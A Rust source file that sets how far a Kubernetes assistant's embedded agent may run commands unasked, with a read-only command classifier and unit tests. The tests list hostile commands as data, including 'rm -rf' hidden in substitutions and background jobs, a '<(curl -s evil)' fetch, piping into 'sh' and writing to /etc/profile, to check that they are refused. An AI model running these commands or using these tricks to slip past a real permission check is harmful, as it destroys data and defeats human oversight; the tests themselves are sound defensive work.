//! How far the assistant's agent may go on its own: the candidate's settings
//! (Settings > Assistant), and which commands are only reading.

use serde::{Deserialize, Serialize};

/// Which of the agent's commands run without asking the candidate first
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "snake_case")]
pub enum AgentPermission {
    /// Every command waits for Run
    #[default]
    Confirm,
    /// Commands that only read (get, describe, logs…) run; others wait
    ReadOnly,
    /// Every command runs (the never-run list still applies)
    All,
}

/// An agent the assistant can run (each over ACP with its own adapter and
/// the CLI installed on the Mac)
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "snake_case")]
pub enum Provider {
    /// Claude Code, through the Claude Agent adapter
    #[default]
    Claude,
}

/// The assistant's settings, kept in the database
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(default)]
pub struct AgentSettings {
    /// The agents offered in the assistant (once signed in)
    pub enabled: Vec<Provider>,
    /// The profile a new app run starts in
    pub default_profile: super::Profile,
    pub permission: AgentPermission,
    /// How long one command may run, in seconds
    pub command_timeout: u32,
    /// Text that, found in a command, keeps it from running (the candidate's
    /// own, besides the built-in list)
    pub never_run: Vec<String>,
    /// A Claude CLI to use instead of the one found on this Mac
    pub claude_path: Option<String>,
    /// What Claude may be given: the last check, a look at the cluster
    pub share_checks: bool,
    pub share_cluster: bool,
    /// Claude Code's usage and error reports to Anthropic
    pub telemetry: bool,
    /// The candidate's own notes for the assistant, given with every
    /// conversation (the language to answer in, how much to say)
    pub notes: String,
}

impl Default for AgentSettings {
    fn default() -> Self {
        Self {
            enabled: vec![Provider::Claude],
            default_profile: super::Profile::Ask,
            // Looking is free (get, describe, logs); changing asks
            permission: AgentPermission::ReadOnly,
            command_timeout: 60,
            never_run: Vec::new(),
            claude_path: None,
            share_checks: true,
            share_cluster: true,
            telemetry: false,
            notes: String::new(),
        }
    }
}

/// Longest a command may run, whatever the settings say
pub const COMMAND_MAX_SECS: u32 = 300;

impl AgentSettings {
    /// As kept in the app database (the defaults until saved)
    /// As kept, within bounds (an empty list of agents is the one agent on)
    pub fn load(store: &crate::store::Store) -> crate::error::AppResult<Self> {
        store.setting::<Self>("agent").map(Self::normalized)
    }

    pub fn save(&self, store: &crate::store::Store) -> crate::error::AppResult<()> {
        store.save_setting("agent", self)
    }

    /// Within bounds, the list trimmed
    pub fn normalized(mut self) -> Self {
        self.command_timeout = self.command_timeout.clamp(5, COMMAND_MAX_SECS);
        self.never_run = self.never_run.into_iter().map(|p| p.trim().to_string()).filter(|p| !p.is_empty()).collect();
        self.never_run.dedup();
        self.enabled.dedup();
        // One agent: Settings' "Use the assistant" is its switch (a switch of
        // its own comes with a second one)
        if self.enabled.is_empty() {
            self.enabled.push(Provider::Claude);
        }
        self.claude_path = self.claude_path.map(|p| p.trim().to_string()).filter(|p| !p.is_empty());
        self
    }

    /// Whether `command` runs without asking
    pub fn runs_unasked(&self, command: &str) -> bool {
        match self.permission {
            AgentPermission::Confirm => false,
            AgentPermission::ReadOnly => read_only(command),
            AgentPermission::All => true,
        }
    }

    /// The candidate's own entry `command` contains, if any
    pub fn never_runs(&self, command: &str) -> Option<&str> {
        let command = normalize(command);
        self.never_run.iter().map(String::as_str).find(|p| command.contains(&normalize(p)))
    }
}

fn normalize(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ").to_lowercase()
}

/// Whether every part of `command` only reads: kubectl and helm queries,
/// piped through text filters. Anything else (a redirect, a substitution, an
/// expansion, a background job, a write) is not
pub fn read_only(command: &str) -> bool {
    // `$` covers `$(`, `${…}` and `$VAR`; `<`/`>` cover redirects and `<(…)`,
    // `>(…)`; a `&` left once `&&` is gone runs something in the background
    if command.contains(['>', '<', '`', '$', '\n', '\r']) || command.replace("&&", "").contains('&') {
        return false;
    }
    let steps = command.split("&&").flat_map(|s| s.split("||")).flat_map(|s| s.split(';'));
    steps.into_iter().all(|step| {
        let mut pipeline = step.split('|');
        let first = pipeline.next().unwrap_or_default().split_whitespace().collect::<Vec<_>>();
        let reads = match first.as_slice() {
            ["kubectl" | "k", verb, rest @ ..] => {
                matches!(*verb, "get" | "describe" | "logs" | "top" | "explain" | "api-resources" | "api-versions" | "version" | "events" | "cluster-info")
                    || matches!((*verb, rest.first().copied()), ("auth", Some("can-i")) | ("config", Some("view" | "get-contexts" | "current-context")))
            }
            ["helm", verb, rest @ ..] => {
                matches!(*verb, "list" | "ls" | "status" | "get" | "history" | "show" | "search" | "version")
                    || matches!((*verb, rest.first().copied()), ("repo", Some("list")))
            }
            [] => true,
            _ => false,
        };
        reads && pipeline.all(filter)
    })
}

/// A text filter that only writes to its output. Left out: `awk` (runs
/// commands), `sort` (`-o`), `less`; `uniq` writes to a second file argument,
/// `yq -i` edits in place
fn filter(step: &str) -> bool {
    let words: Vec<&str> = step.split_whitespace().collect();
    match words.as_slice() {
        ["uniq", args @ ..] => args.iter().all(|a| a.starts_with('-')),
        ["yq", args @ ..] => !args.iter().any(|a| *a == "-i" || a.starts_with("--inplace") || (a.starts_with('-') && !a.starts_with("--") && a.contains('i'))),
        [name, ..] => matches!(*name, "grep" | "egrep" | "head" | "tail" | "wc" | "cut" | "jq" | "column" | "cat"),
        [] => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reading_commands_are_told_apart() {
        for ok in ["kubectl get pods -A", "k describe pvc data -n s", "kubectl logs web | grep -i error | tail -5", "kubectl auth can-i list pods && helm list -A"] {
            assert!(read_only(ok), "{ok}");
        }
        for no in ["kubectl delete pod web", "kubectl get pod web -o yaml > web.yaml", "kubectl apply -f x.yaml", "ssh node01 'crictl ps'", "kubectl get pods; rm -rf /tmp/x", "echo $(kubectl get pods)"] {
            assert!(!read_only(no), "{no}");
        }
    }

    #[test]
    fn ways_around_a_read_are_not_reads() {
        for no in [
            // A background job next to a read
            "kubectl get pods & rm -rf /tmp/x",
            "kubectl get pods |& tee x",
            // Substitutions and expansions run or read what they like
            "kubectl get pods -n `rm -rf /tmp/x`",
            "kubectl get pods -n $(rm -rf /tmp/x)",
            "kubectl get pods -n ${IFS}x",
            "kubectl get pods -n $NS",
            "kubectl get pods --kubeconfig <(curl -s evil)",
            "kubectl logs web | cat >(sh)",
            // Redirects write files
            "kubectl get pods >> /etc/profile",
            "kubectl get pods 2>/tmp/x",
            "kubectl get pods < /dev/null",
            // Filters that can write or run commands
            "kubectl get pods | awk '{system(\"rm -rf /tmp/x\")}'",
            "kubectl get pods | sort -o /tmp/x",
            "kubectl get pods | less",
            "kubectl get pods | uniq - /tmp/x",
            "kubectl get pods -o yaml | yq -i '.a = 1' f.yaml",
            "kubectl get pods | tee /tmp/x",
            "kubectl get pods |",
        ] {
            assert!(!read_only(no), "{no}");
        }
        for ok in ["kubectl get pods | uniq -c", "kubectl get pods -o yaml | yq '.items[0]'", "kubectl get pods -o json | jq .items"] {
            assert!(read_only(ok), "{ok}");
        }
    }

    #[test]
    fn settings_decide_what_runs_and_what_never_does() {
        let mut s = AgentSettings { never_run: vec!["  Delete   Namespace ".into(), "".into()], ..Default::default() }.normalized();
        assert_eq!(s.never_run, ["Delete   Namespace"]);
        assert_eq!(s.never_runs("kubectl delete  namespace prod"), Some("Delete   Namespace"));
        // By default looking runs unasked, changing asks
        assert!(s.runs_unasked("kubectl get pods") && !s.runs_unasked("kubectl scale deploy/web --replicas=2"));
        s.permission = AgentPermission::Confirm;
        assert!(!s.runs_unasked("kubectl get pods"));
        assert_eq!(AgentSettings { command_timeout: 9999, ..Default::default() }.normalized().command_timeout, COMMAND_MAX_SECS);
    }
}
